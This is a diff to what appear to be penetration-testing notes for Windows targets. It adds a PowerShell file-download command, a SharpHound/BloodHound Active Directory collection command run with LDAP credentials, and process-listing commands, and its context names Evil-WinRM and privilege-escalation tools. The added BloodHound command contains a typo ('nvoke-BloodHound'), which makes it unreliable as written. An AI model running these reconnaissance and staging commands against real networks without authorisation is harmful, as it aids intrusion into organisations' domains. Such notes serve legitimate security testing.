@@ -132,10 +132,12 @@ $ stty rows 38 columns 250
 
 # Windows
 
+ - Download file: $WebClient = New-Object System.Net.WebClient
+$WebClient.DownloadFile("https://www.contoso.com/file","C:\path\file")
+
 ## Tools
 
- - Bloodhound: discover vulnerabilities in your AD. You need to run `Invoke-BloodHound -Domain <DOMAIN> -LDAPUser <USER> -LDAPPass <PASS> -CollectionMethod All -DomainController <DomainController>  -ZipFileName data.zip` to get the data to feed Bloodhound.
-
+ - Bloodhound: discover vulnerabilities in your AD. You need to run `powershell -Command "Import-Module .\SharpHound.ps1;nvoke-BloodHound -Domain <DOMAIN> -LDAPUser <USER> -LDAPPass <PASS> -CollectionMethod All -DomainController <DomainController>  -ZipFileName data.zip -Verbose"` to get the data to feed Bloodhound.
  - Invoke-ACLPwn: Useful if the user has the WriteDACL right
  - [Evil-RM](https://github.com/Hackplayers/evil-winrm) : shell to connect to WinRM
  - enum4linux
@@ -152,6 +154,11 @@ Get all infos about user:
 
 With SEImpersonification, have a look to [LovelyPotato](https://github.com/TsukiCTF/Lovely-Potato)
 
+Running processes:
+
+    tasklist
+    tasklist /FI "ImageName eq ExeFile.exe" /v /fo List
+    wmic process get ProcessID,ExecutablePath
 
 Querying the registery
 
